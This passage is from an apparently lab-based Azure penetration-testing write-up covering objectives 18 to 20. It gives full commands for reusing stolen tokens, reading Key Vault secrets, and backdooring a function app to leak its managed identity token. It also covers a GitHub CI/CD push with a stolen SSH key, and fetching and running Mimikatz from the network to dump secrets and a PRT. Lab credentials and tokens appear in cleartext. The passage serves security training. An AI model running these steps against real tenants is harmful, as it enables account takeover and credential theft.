$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MjAzNzgzMTQsIm5iZiI6MTYyMDM3ODMxNCwiZXhwIjoxNjIwNDY1MDE0LCJhaW8iOiJFMlpnWVBocXBIa3l1c0Q4dlV2RmdwOEZzejN6QUE9PSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiX29udnVsSHpVMHU2bXJSa1g2c19BdyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9JVC9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9wcm9jZXNzZmlsZSIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.GUNNWYtSc4vsXoAFAmsKWag4oPPlqsbMgiZ7GcL1WW_gFm_nstZZR4DWZQ_Rbja-6y_cSQmA6BMcyCgsFMqoive1Hox4aHUxxSh8ZSwvkPALjePnX48pPTnYz74P-ycaTrdTVpK7lBTehWl4K8jh_IKMaiF-DAy07rnN4gGGQTYQtexx6FulEY7U-hm6VISjUHM0iJLoHCcf_bTp3MZE7y-L5b9Y6Kx_U1w3PtsCiDMGJnBzOb9RtFXZUKCp5Cklp9lKXqQOL2DsmatdHxLuepcA8I_vXcZ2f_x38-e77b1Myq9dZN9MbNZsZqDns5A0TcmDS_2tbUSc9_Jj7GLBCQ"
$graphaccesstoken = "eyJ0eXAiOiJKV1QiLCJub25jZSI6IkgtVjRmYnAyS2FyMmo2ZnNKb0hKcUJIX3B6TzE4LUhZZlp1OWRqMlV5VmMiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYyMDM3ODMxNCwibmJmIjoxNjIwMzc4MzE0LCJleHAiOjE2MjA0NjUwMTQsImFpbyI6IkUyWmdZT0J3VHRXWS9OSTJ0OEMwVVdhNlJYYzhBQT09IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiOFJ1b281N3pORVNXb2FzdzJRXy1BdyIsInZlciI6IjEuMCIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.KKry996hNck9pEBr8zgkSKBmDBAu7bR2Arvjkx7k-kJdcHwn5TdJwnfhn2u7ZnY1DGLkP0XP5uCYLxEhaGdQXoT_9t6ngs1pVmnmyozJnuaAs2ia2lmzx8a_BIw5phEEZedERi_Ux7YO0peQmstt_S525B1kIkkpCQcQ9Y-UNFueMEBy4bj5pQRgplXHwj7Iy7tRcy4gA-pbiTEFYRCadQ-bYdluDUOBrkXG3Y12ZEokc3wZY5P1QoeHxuGGBlhfAW2v93hCfO-bKyNshz2zZ2Z3soa1DL5P37S10XhdJLOQbpRQFLzJ7FbAeL0QRRIXMOS3E5DOjhZJvs9bVlBo2A"
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

![picture 132](images/a5c76f4eb957251735ca16e03827767d4bbcc68ba0664545f1af5e518ff60ccb.png)  

<br/>

Then use the script `Add-AzADAppSecret.ps1` to add a secret:

```
. C:\AzAD\Tools\Add-AzADAppSecret.ps1; Add-AzADAppSecret -GraphToken $graphaccesstoken -Verbose
```

![picture 133](images/152998794ff711cab189197e091ede2b03e4392cc09aa8b8389c553ca40facd8.png)  

- Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
- App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
- App Name  : fileapp
- Key ID    : 2e89622a-13b4-45ae-86e2-2caec7b07ea1
- Secret    : AM-VQY-4t4i~xb~ISFHDeY2K9rO3KEFojy

<br/>

Then try to use the credential and secret to authenticate as the service principal:

```
$password = ConvertTo-SecureString "AM-VQY-4t4i~xb~ISFHDeY2K9rO3KEFojy" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983f-a7f3bd317d8f', $password); Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```

![picture 134](images/5351fba59d4bd2e16eba6271505cd5c19a42d8b6ffe36505793a6495283047b8.png)  

<br/>

Enumerate accessible resources:

```
Get-AzResource
```

![picture 135](images/523040a4f1a9774a333f856598147ad4d4b5f82d24bce7a5de1e5cc10adbf84c.png)  

We can access a vault:

- Name: `credvault-fileapp`
- ResourceId: `/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/IT/providers/Microsoft.KeyVault/vaults/credvault-fileapp`

<br/>

List and read the vault data:

```
Get-AzKeyVaultSecret -VaultName 'credvault-fileapp'
```

![picture 136](images/a488e702accf482cb7f5132fe9a8b599eb7fa5f206f9b5fb09aa92edfefa8948.png)  

```
Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
```

![picture 137](images/8fbcee3e74641a865db748d8fd78d9284902c42e40deddcdc3f5a0ed2fbe9bca.png)  

We get a credential:

- DavidDHenriques@defcorphq.onmicrosoft.com / `!@Ka%%ya71&*FG2243gs49`

<br/>

Use this credential to access Azure:

```
$password = ConvertTo-SecureString "!@Ka%%ya71&*FG2243gs49" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("DavidDHenriques@defcorphq.onmicrosoft.com", $password); Connect-AzAccount -Credential $creds
```

![picture 138](images/89d02f8e14befb68830260b85b9028aa3e9190f40a9911e33e7d43c7fbe3e40f.png)  

- Due to access policy, we cannot use this credential to access the tenant

<br/>

The secret name `MobileUsersBackup` indicates a potential condition - mobile user. Possible it is a User-Agent constraint.

<br/>

Try to access via Azure Portal and use the browser setting to pretend like an iPad Pro user:

![picture 139](images/ab2814a22f021e89b67398d286c55941417a75185085cedce6ddcd240a10772a.png)  

![picture 140](images/ccc1984ef6e15999d244e1be97e590e82565955718cf2e670106e1408149d770.png)  

- As shown, we can log in Azure portal.

<br/>

Enuemrating the resources, in `Stagingnv`, we can see a Deployment under **Settings > Deployments**:

![picture 141](images/32454111d7b1b8c032f00cb909db47a0975da7816a3f71c6db1dd114b724134a.png)  

<br/>

Checking the deployment template, under `VMIP01`, we can see in the section `resources.properties.settings.commandToExecute`, there is a credential in cleartext:

```
$username = \"thomasebarlow@defcorpit.onmicrosoft.com\";$password=\"%%^Da@asyu0(@*&48VVf6\";$SecurePassword = ConvertTo-SecureString \"$password\" -AsPlainText -Force;$credentials = New-Object System.Management.Automation.PSCredential($username, $SecurePassword);Login-AzAccount -Credential $credentials;Get-AzureADTenantDetail
```

- thomasebarlow@defcorpit.onmicrosoft.com / `%%^Da@asyu0(@*&48VVf6`

<br/>

---

## Objective 19: Abuse Function app with GitHub CD

**Questions**

1. Using the secrets from the application backup found in the '`defcorpcodebackup`' storage account, make changes to a GitHub account to push changes to a Function App.
2. Abuse the managed identity of the function app to extract credentials for a user from deployment history.
3. Extract a SSH key for a GitHub account from the 'codebackup' storage account.
4. Use the SSH key to access the GitHub account, modify code and trigger a function app that uses the modified code.

<br/>

**Answers**

In Objective 13, we have got two GitHub credentials:

- jenniferazad / `j3n!F3juF!_b@p9!`
- laurenazad / `j@(k@y9&yTWQQ_=` / 2FA: `GitHub:laurenazad?secret=ZIG7QB6EUEN6M4K5`

![picture 143](images/de0fe54d98962f06ea716979209b431d4d20344b9ea6222292c31003fe42bac8.png)  


<br/>

Access the GitHub repo "https://github.com/DefCorp/SimpleApps" using laurenazad's credential:

![picture 144](images/a7994cc448ce84cf516c14fd084320b1d5ecb48ce2e554cd4b317c0f10c3b9d2.png)  

![picture 145](images/2d7d27858d13ca1a794ec52ec94bc5a458c7856d11472a1cc770d99c077bcd91.png)  

- The repo has CI/CD set up
- The function app code will enable calling the function app URL `https://simpleapps.azurewebsites.net/api/Student<enterid>`

<br/>

Checking `SimpleApps/.github/workflows/main_SimpleApps.yml`:

```
# Docs for the Azure Web Apps Deploy action: https://github.com/azure/functions-action
# More GitHub Actions for Azure: https://github.com/Azure/actions

name: Build and deploy Python project to Azure Function App - SimpleApps

on:
  push:
    branches:
      - main
  workflow_dispatch:

env:
  AZURE_FUNCTIONAPP_PACKAGE_PATH: '.' # set this to the path to your web app project, defaults to the repository root
  PYTHON_VERSION: '3.9' # set this to the python version to use (supports 3.6, 3.7, 3.8)

jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    steps:
    - name: 'Checkout GitHub Action'
      uses: actions/checkout@v2

    - name: Setup Python ${{ env.PYTHON_VERSION }} Environment
      uses: actions/setup-python@v1
      with:
        python-version: ${{ env.PYTHON_VERSION }}

    - name: 'Resolve Project Dependencies Using Pip'
      shell: bash
      run: |
        pushd './${{ env.AZURE_FUNCTIONAPP_PACKAGE_PATH }}'
        python -m pip install --upgrade pip
        pip install -r requirements.txt --target=".python_packages/lib/site-packages"
        popd
    - name: 'Run Azure Functions Action'
      uses: Azure/functions-action@v1
      id: fa
      with:
        app-name: 'SimpleApps'
        slot-name: 'production'
        package: ${{ env.AZURE_FUNCTIONAPP_PACKAGE_PATH }}
        publish-profile: ${{ secrets.AzureAppService_PublishProfile_6d45a4d786e44e0e985b746d311ac11c }}
```

As shown in the CI script, it runs `SimpleApps` in the step `Run Azure Functions Action`.

<br/>

Checking `SimpleApps/Student190/__init__.py`:

```
import logging

import azure.functions as func


def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    name = req.params.get('name')
    if not name:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('name')

    if name:
        return func.HttpResponse(f"Hello, {name}. This HTTP triggered function executed successfully. ")
    else:
        return func.HttpResponse(
             "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response.",
             status_code=200
        )
```

- It tries to get the parameter `name` and returns a HTTP response message

<br/>

Try to access the URL `https://simpleapps.azurewebsites.net/api/Student190`

![picture 146](images/017a1c27746bcd62c597348e5fc046a75027aca0423b825c947d814d60936a7f.png)  

`https://simpleapps.azurewebsites.net/api/Student190?name=Testing190`

![picture 147](images/08518aa0fc3cffc4adc9ee4b332542ebc15c3607c1039612af3f3de08b99cd05.png)  

<br/>

That is to say, if we modify the source code `__init__.py`, we can get the Function App to execute the Python code we want. Again, we can leverage this to get the token. Replace the code with the following:


```
import logging
import azure.functions as func


def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = f'curl "{IDENTITY_ENDPOINT}?resource=https://management.azure.com&api-version=2017-09-01" -H secret:{IDENTITY_HEADER}'
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```

![picture 150](images/a2e4ade897548162d8d368bb08b00a1d3c2d5f343fae28e3adead880fe98dd19.png)  

<br/>

Then commit the change to the main branch. Again access `https://simpleapps.azurewebsites.net/api/Student190`:

![picture 151](images/39b497ad735accd81c9b2c15fa38e01b25362ca58075e2e0cf485dab690069bd.png)  

```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYyMDM4MzEwNCwibmJmIjoxNjIwMzgzMTA0LCJleHAiOjE2MjA0Njk4MDQsImFpbyI6IkUyWmdZUEROWGxGeHRwVzF5RExvcjZQeDZWdW5BQT09IiwiYXBwaWQiOiI5NWY0MGVlYS02NjUzLTRlMTEtYjU0NS1kOWMyZjVmOTBhMjkiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwib2lkIjoiZTY1Yjc5MTItNWI3ZS00ZGNiLWEzMmQtMDFjN2Q0NzkzMDFlIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHR1b085SlZUWmhGT3RVWFp3dlg1Q2lsd0FBQS4iLCJzdWIiOiJlNjViNzkxMi01YjdlLTRkY2ItYTMyZC0wMWM3ZDQ3OTMwMWUiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJZdElHekFqTUxFeTdNRkYydWZkRkF3IiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0ZpbmFuY2UvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvU2ltcGxlQXBwcyIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.WzIa1NqQGHN6oGIWyyqA21v3w8H7NZsdCLlT-7pFB_f1jjX4i0T8Gche7SmLuv_6xnuspuLD5Nc48zjlSA8fSFcBnzVvCVJaGSnFeaCfHq42SwfvmA6y5bJdrpRXXs9wT3tU3cF358Uc6aI9iFtCDxnfeu-Nl6aH4aDcJ8iF5IfZ5zp10fQEQMELW7DHOLcin32W9DyHLTAoJXvfDRsPc47qruyTBIcL97bkBM3n1odqWrE1cjNe6OjNpjaypsfS_kExCqk9cGrS4ohmwcHQnaU1bmVDjkUn_aW4uswOc5X52e1MrfvYudGLN7iuio-0eulxtcObYyF3z1y9p0o_Mw","expires_on":"05/08/2021 10:30:03 +00:00","resource":"https://management.azure.com","token_type":"Bearer","client_id":"95f40eea-6653-4e11-b545-d9c2f5f90a29"}
```

<br/>

Use the Bearer token to see what we can access:

```
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYyMDM4MzEwNCwibmJmIjoxNjIwMzgzMTA0LCJleHAiOjE2MjA0Njk4MDQsImFpbyI6IkUyWmdZUEROWGxGeHRwVzF5RExvcjZQeDZWdW5BQT09IiwiYXBwaWQiOiI5NWY0MGVlYS02NjUzLTRlMTEtYjU0NS1kOWMyZjVmOTBhMjkiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwib2lkIjoiZTY1Yjc5MTItNWI3ZS00ZGNiLWEzMmQtMDFjN2Q0NzkzMDFlIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHR1b085SlZUWmhGT3RVWFp3dlg1Q2lsd0FBQS4iLCJzdWIiOiJlNjViNzkxMi01YjdlLTRkY2ItYTMyZC0wMWM3ZDQ3OTMwMWUiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJZdElHekFqTUxFeTdNRkYydWZkRkF3IiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0ZpbmFuY2UvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvU2ltcGxlQXBwcyIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.WzIa1NqQGHN6oGIWyyqA21v3w8H7NZsdCLlT-7pFB_f1jjX4i0T8Gche7SmLuv_6xnuspuLD5Nc48zjlSA8fSFcBnzVvCVJaGSnFeaCfHq42SwfvmA6y5bJdrpRXXs9wT3tU3cF358Uc6aI9iFtCDxnfeu-Nl6aH4aDcJ8iF5IfZ5zp10fQEQMELW7DHOLcin32W9DyHLTAoJXvfDRsPc47qruyTBIcL97bkBM3n1odqWrE1cjNe6OjNpjaypsfS_kExCqk9cGrS4ohmwcHQnaU1bmVDjkUn_aW4uswOc5X52e1MrfvYudGLN7iuio-0eulxtcObYyF3z1y9p0o_Mw"
Connect-AzAccount -AccessToken $token -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29

Get-AzResourceGroup
```

![picture 152](images/580f5717930ad2652dd46c1718c9eef0fcd0f99c65ef8253d4437527b2d5ec92.png)  

We have access to SAP:
- SAP
- ResourceId: `/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/SAP`

<br/>

Check if the managed identity can read any deployment in the resource group `SAP`:

```
Get-AzResourceGroupDeployment -ResourceGroupName SAP
```

![picture 153](images/20a430cd60296f1aec1d98e40ade15aed6b45d3374d3cd02b307bc4903b1acd9.png)  

- Deployment Name: `stevencking_defcorphq.onmicrosoft.com.sapsrv`

<br/>

Get the deployment template:

```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
```

![picture 154](images/3462b5b0f806cd9591803e8f098551403ad0b763162579755443e04542fa9fc7.png)  

<br/>

Checking the deployment template, there is a cleartext credential:

```
cat C:\Windows\system32\stevencking_defcorphq.onmicrosoft.com.sapsrv.json
(cat C:\Windows\system32\stevencking_defcorphq.onmicrosoft.com.sapsrv.json | ConvertFrom-Json | Select -ExpandProperty Resources).resources.Properties.Settings.commandToExecute
```

![picture 155](images/7a3becfa3d4babe566bc45a2b75fc280d6125de122895c9b2a844370ce974b25.png)  

- Found credential:  `stevencking@defcorphq.onmicrosoft.com` / `@@#^(YanuGFASF569*8`

<br/>

Then use the newly discovered credential to check the available resources:

```
Disconnect-AzAccount; $password = ConvertTo-SecureString "@@#^(YanuGFASF569*8" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("stevencking@defcorphq.onmicrosoft.com", $password); Connect-AzAccount -Credential $creds
```

![picture 156](images/37528b4434892909946ee96266dd1df76f6086cc2dcb57856fc1d6ac408a6ce7.png)  

```
Get-AzResource
```

![picture 157](images/389cfe1acb7cb895a3fcc7eb63529a0faf51b8af65d8d19557898fc5af19db85.png)  

- Accessible Storage Account: `defcorpcodebackup`
- Resource Group Name: `Finance`

<br/>

```
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name defcorpcodebackup -ResourceGroupName Finance).Context
```

![picture 158](images/1921d8cbb53f9138e0bb087d507a8e3fc4ccf2c6643f6cb42a02085c4d1269d3.png)  

- However it doesn't allow container listing. Try to use Storage Explorer instead.

<br/>

![picture 159](images/12ae4db030533b42f0e7272bef04e6c4fde5787cd41e6cacf650c8bd77d4957a.png)  

Containers:
- client
  - app.zip
  - authenticator.txt
- secrets
  - id_rsa
  - README.md

<br/>

Download all the files. In the `secrets` container, there is a private key file `id_rsa`, and the file `README.md` indicates it is the private key of `jenniferazad`.

Recall in **Objective 13**, we find the secret of `jenniferazad` to be `j3n!F3juF!_b@p9!`. Try to access GitHub using both the private key and secret.

```
ssh -i C:\Users\studentuser190\Desktop\backup-steven\secrets\id_rsa git@github.com
```

![picture 160](images/7a5273ca898ff0f922628f818eef2e2a0b0a296e6da14e97215b97c99ade821a.png)  

- As shown, we have successfully logged in Github as `jenniferazad`.

<br/>

Checking on Github, there is another Repo called `CreateUsers` where `jenniferazad` has a lot of activities:
- https://github.com/DefCorp/CreateUsers/commits?author=jenniferazad


![picture 161](images/29fcfd56edd36f5491a3f721bd8f92465e183c4945a64a17cb8ce86379bf4028.png)  

<br/>

Clone the repo in the local:

```
copy C:\Users\studentuser190\Desktop\backup-steven\secrets\id_rsa C:\Users\studentuser190\.ssh\id_rsa; ssh -T git@github.com;  git clone git@github.com:DefCorp/CreateUsers.git
```

![picture 162](images/892e09b8d1f38c48e3af94bfafe267d398421adf1fbc9d7ffae9c6902ff1f460.png)  

<br/>

Create `user.json` in `CreateUsers\student190\`:

```
{
  "accountEnabled": true,
  "displayName": "student190",
  "mailNickname": "student190",
  "userPrincipalName": "student190@defcorphq.onmicrosoft.com",
  "passwordProfile": {
    "forceChangePasswordNextSignIn": false,
    "password": "Stud190Password@123"
  }
}
```

<br/>

Then push the updated file to git:

```
cd C:\Users\studentuser190\Desktop\CreateUsers\student190\
git add .
git config --global user.email "81172144+jenniferazad@users.noreply.github.com"
git config --global user.name "jenniferazad"
git commit -m "student190 update"
git push
```

![picture 163](images/28e577b34da9b84a8248e377b21bae0fde42ec5301903c65e484f57d0cf3b3d6.png)  

<br/>

Then access https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=190:

![picture 164](images/63fba9d9bc27e47bdbdc0c57d820d9cee7a1e0335d2410dc37dd82bfc36a40bc.png)  

- As shown our student190 user is added

<br/>

---

## Objective 20: Lateral Movement, AD joined machine & Pass-the-certificate

**Questions**

Using the access to jumpvm VM, extract secrets for `samcgray@defcorphq.onmicrosoft.com` and execute a pass-the-certificate attack to compromise infradminsrv VM.

<br/>

**Answers**

Continuing **Objective 17**, we have the access to `jupmvm`:

```
$pass = ConvertTo-SecureString 'StudPassword@123' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('student190', $pass); $jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds; Enter-PSSession -Session $jumpvm
```

![picture 165](images/2257396cf2a05e873beb9803759af2703040b6ae338ffa60b6c33dddec07a13b.png)  

<br/>

Use `Invoke-Mimikatz.ps1` to try to dump secrets:

```
iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

![picture 166](images/f3fa818a47328612fe3bb2d3403c9e1d9ae05cc3d5585a453f3f1aeb8a2f072c.png)  

- The service account (`SNMPTRAP`) password `vmuser`:  `ItisSuperS3cr3tP@$$w0rd!@#`

<br/>

Next connect as `vmuser`:

```
$pass = ConvertTo-SecureString 'ItisSuperS3cr3tP@$$w0rd!@#' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('vmuser', $pass); $jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds; Enter-PSSession -Session $jumpvm
```

![picture 167](images/562623c4446b6eb81afc22c0728cffccae49e6054460911e87597571724f6f76.png)  

<br/>

Staged some data collections and tools in `C:\Users\vmuser\Documents\student190:

```
mkdir C:\Users\vmuser\Documents\student190
```

![picture 168](images/cc67096aab52462456dc06f074898cce833714ad7f287ed43823884e4db5c8e5.png)  

<br/>

Check if `jumpvm` is AzureAD-joined:

```
dsregcmd /status
```

![picture 169](images/396e7808e95fa5e7e934202249f3e2f180cf9c35c374c33c963f9b66b08c2378.png)  

- `jumpvm` is Azure AD joined

<br/>

Use `Invoke-Mimikatz` to extract the PRT and session key in memory:

```
iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```

![picture 170](images/59555f901a13c6c9f0ac2b06ed045cf117bd848f8e51672a8030754138d18ea6.png)  

- PRT
```
MC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBTEUuQWdBQkFBQUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQOTFtU1cxb285VjduZHUzUk5wc1lqOTdSck1HTE93S1k3TGRUR1gxUGR2UHR3YlpQR040V2RIVkl5bjlacXhkMnV3Q1ZPN0pGb0t1ZlY5WTVDUncxTDk2V1FvSzBoSDNhWWYxTnpxMnFpbUtESDJJaWdoZjVjT0NmSzlDRWxYTnMxYmltZEdLRHlGZVhyNUNTb3d1RTdFaGR1cjhRWkM1OWJyWXFDS1dJd2cyZjlqZ3B1SGR1Zy14QlVNSXpzX01VaElyTTUxUTlHNXdHUVFPWmxMb1ZIdlBfcVo3WkpqbGh1SkFYNFVMaThxcjgtUTQ3ZnN2V3lhb1NZRHlaMVVoSjdzUjg1aVI1OEs4RFZnQVpzRTFRemxyN1B6alE2TDYyaWo1M1kxVGQzM1FYMXVtcklRVWdWVzExNG9fU3loTmF3TWtQYW5xT2xKVjFXYXd1bG9LVVh3ZmNVTkcwUDkyV0tURUdHaEFaQVlob1o4eTc5N0F5SXAtX0pUVHUzdm42Ui05dS0wVk5CR01ETkNLWlltay15MGdzQmN4T1Z6Z29LZTJaeGRrSkktbjlqZW5hdkpUTC1kS2tFcHQ4NDdQS1g4aWpjMnJzNThyeUVacFFXb3pvUU9UMzF5Z2wtc0UxZ0hwSlhPQlV1ZzUtVnFiQ2ZTRnAyRjhHOGE0RmRLY2FUSlpLcVg3ZWUyLVFaQWc0a2FadFRUdHMzT2NKN0U0TlBNV00zcXdQUzE4SzhWZHc5V1YxQTZodlZUeVpEMkVmT0ZYLVpGLVo3cHdjVWJjbUhaaDA1MWlYbGQzald5UGhfR1JuRDEwZzhiNHZuVXliQ0xKQ1lOdWhfeFRlSmJVUzlzbDdkb0E2Rm9NSUxHbTVrVzduNzFkWVozQkU0VzY3Qjdtc1pITW9maEo0U0xLcGliSXR0VlBuaGJsVlNzcDNMQVViYlZXSVBfdTVtbGh4dDdqajlycXA1VDM4M3NaSGNpSmZBWXc2d1VqVjQ2YS03ZXBZTUtiUVVtLTNIU1ZsRy1uQjR6cFJ4VHZ1Ujh3ZHlVQ25zdnhzallOSUdBZXJyVDBOR3htWVg5Q1hHelZ0NXBpMGFzSC1TMWVmNW5QclA5UGpPNmtqLU9Bak9QNGN1ckVIY2xwWFBidWdYZ0pnRmhQekJKRnczUXBaX0RZS1JOaTZXMVNfQjlmVlVMR1JoU0dhQS1ZX05RUXFKTEloTzdWLXRrdlc0SzlkdEZBX202R0dLR2pNTXZ5V1JZSUc5VW9BT1BXUWt4SzZwa3FXTVFSODVXLVlLNDc0dnAwbkNIVF9yM18tZnBNdU93TU1GSmR5c0doUUJfU0hNWUNLdWJjLTdMUFh2cHdTd0xhQWNRV2hJT2J5cFRZQTBORkQ2b1lqNVZxU3JPSzNscXRR
```

- KeyValue

```
